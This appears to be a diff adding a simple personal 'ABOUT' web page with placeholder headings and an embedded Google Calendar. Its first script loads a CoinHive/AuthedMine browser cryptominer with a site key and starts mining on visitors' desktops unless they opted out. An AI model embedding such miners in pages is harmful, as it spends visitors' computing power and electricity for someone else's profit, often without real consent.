@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('BL5kbxUy8iU8la4mF0VTxKgahqK1w1CY', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+		miner.start();
+	}
+</script>
+<head>
+	<meta charset="utf-8">
+	<title>ABOUT</title>
+	<style> h1 { color: red; padding: 10px; text-decoration: underline; } </style>
+	<style>
+	body {
+		background-color: rgb(0,255,0);
+
+	}
+	h1 {
+		background-color: yellow;
+	}
+	p {
+		background-color: rgb(0,255,0);
+	}
+</style>
+</head>
+<body>
+	<center>
+		<h1>title</h1>
+		<H2>sub title</H2>
+		<iframe src="https://calendar.google.com/calendar/embed?src=h696m8pi6mf9lom1dd1jaak6s4%40group.calendar.google.com&ctz=America%2FNew_York" style="border: 0" width="800" height="600" frameborder="0" scrolling="no"></iframe>
+		</center>
+	</body>
+	</html>
